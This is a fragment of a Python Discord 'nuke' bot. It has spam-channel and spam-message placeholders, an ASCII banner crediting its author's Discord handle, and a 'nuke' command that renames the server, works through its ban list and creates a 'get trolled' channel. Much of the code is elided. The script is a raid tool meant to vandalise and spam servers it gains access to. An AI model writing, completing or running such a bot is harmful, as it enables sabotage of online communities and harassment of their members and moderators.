...
SPAM_CHANNEL = ["Insert Spam Message Here"]
SPAM_MESSAGE = ["Insert Spam Message Here"]
...
░░░██║░░░██║░░██║██║░░██║╚█████╔╝██║░░░░░███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚══════╝
Official contact: @[GETO] ཌυҡσяད Thrope#1297 on discord''')
    await client.change_presence(activity=discord.Game(name="Thrope's Bot")
                                 )
...
async def nuke(ctx):
    ...
    guild = ctx.guild
    try:
        await guild.edit(name = "Change the server name to whatever you want")
    ...
    for ban_entry in banned_users:
        ...
        try:
            ...
            print(Fore.GREEN +
                  ...
                  Fore.RESET)
    await guild.create_text_channel("get trolled")
